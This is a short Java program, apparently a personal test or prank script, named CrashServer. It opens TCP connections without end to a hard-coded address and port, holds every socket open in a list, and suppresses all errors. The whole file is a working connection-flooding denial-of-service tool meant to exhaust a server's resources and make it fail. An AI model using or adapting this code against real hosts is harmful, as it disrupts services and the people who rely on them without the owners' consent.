import java.net.Socket;
import java.util.ArrayList;

/**
 * Created by kenny on 4/15/16.
 */
public class CrashServer {
    public static void main(String[] args){
        try {
            ArrayList<Socket> s = new ArrayList<Socket>();
            while (true) {
                s.add(new Socket("10.99.84.32", 9091));
            }
        } catch (Exception e){

        }
    }
}
